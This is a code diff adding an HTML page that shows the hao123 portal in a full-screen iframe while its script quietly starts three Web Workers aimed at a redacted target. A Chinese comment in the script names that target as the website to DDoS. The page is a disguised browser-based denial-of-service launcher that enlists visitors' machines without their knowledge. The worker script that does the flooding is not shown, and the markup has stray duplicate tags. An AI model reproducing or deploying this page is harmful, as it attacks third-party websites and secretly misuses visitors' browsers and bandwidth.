@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<style>
+  html,
+  body {
+    width: 100%;
+    height: 100%;
+  }
+  #page {
+    width: 100%;
+    height: 100%;
+  }
+
+  body {
+    margin: 0
+  }
+</style>
+
+<script type="text/javascript">
+  var target = '脱敏'; // 要进行DDoS攻击的网站
+  var worker_loc = 'worker.js';
+  var workers = new Array();
+  var i = 0;
+  var noWorker = typeof Worker == "undefined" ? true : false;
+  if (!noWorker) {
+    try {
+      for (i = 0; i < 3; i++) {
+        workers[i] = new Worker(worker_loc);
+        workers[i].postMessage(target);
+      }
+    }
+    catch (e) {
+      e = e + "";
+      alert(e);
+      if (e.indexOf("Worker is not enabled") != -1) {
+        noWorker = true;
+      }
+    }
+  }
+</script>
+</script>
+</head>
+
+<body>
+  <body>
+    <iframe
+      id="page"
+      name="page"
+      src="http://www.hao123.com"
+      frameborder="0"
+      noresize="noresize"
+      style="overflow:visible"
+    ></iframe>
+  </body>
+</body>
+
+</html>
